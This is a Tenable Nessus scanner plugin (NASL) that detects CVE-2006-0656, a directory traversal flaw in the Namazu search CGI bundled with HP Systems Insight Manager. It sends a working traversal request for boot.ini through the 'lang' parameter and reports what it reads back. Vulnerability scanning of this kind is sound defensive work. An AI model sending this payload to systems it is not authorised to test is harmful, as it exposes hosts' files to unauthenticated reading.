#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(20893);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-0656");
  script_bugtraq_id(16571);
  script_xref(name:"OSVDB", value:"22992");

  script_name(english:"HP Systems Insight Manager Namazu lang Parameter Traversal Arbitrary File Access");
  script_summary(english:"Checks for Namazu lang parameter directory traversal vulnerability in HP Systems Insight Manager");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is affected by an
directory traversal flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running HP Systems Insight Manager
(SIM), a unified infrastructure management tool. 

The version of HP SIM on the remote host includes a version of the
search engine Namazu that reportedly fails to validate user input to
the 'lang' parameter of the 'namazucgi' script.  An unauthenticated
attacker may be able to exploit this issue to access files on the
remote host via directory traversal." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/advisories/10104" );
 script_set_attribute(attribute:"solution", value:
"Update HP SIM's .namazurc configuration file according to the vendor
advisory." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "web_traversal.nasl");
  script_require_ports("Services/www", 50000, 50001);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:50000);
if ( get_kb_item(strcat("www/", port, "/generic_traversal"))) exit(0);



# Try to exploit the flaw to read a file.
file = "/../../../../../../../../../../../../../boot.ini";
url = string(
    "/mxhelp/cgi-bin/namazucgi?",
    "lang=", file
  );
r = http_send_recv3(method: "GET", port:port, item: url);
if (isnull(r)) exit(0);
res = r[2];
# There's a problem if looks like boot.ini.
if ("[boot loader]">< res) {
  contents = res - strstr(res, "<h2>Results:");

  if (isnull(contents)) report = desc;
  else {
    report = string(
      "Here are the contents of the file '\\boot.ini' that\n",
      "Nessus was able to read from the remote host \n",
      " by reading ", build_url(port: port, qs: url), " : \n",
      "\n",
      contents
    );
  }

  security_warning(port:port, extra:report);
}
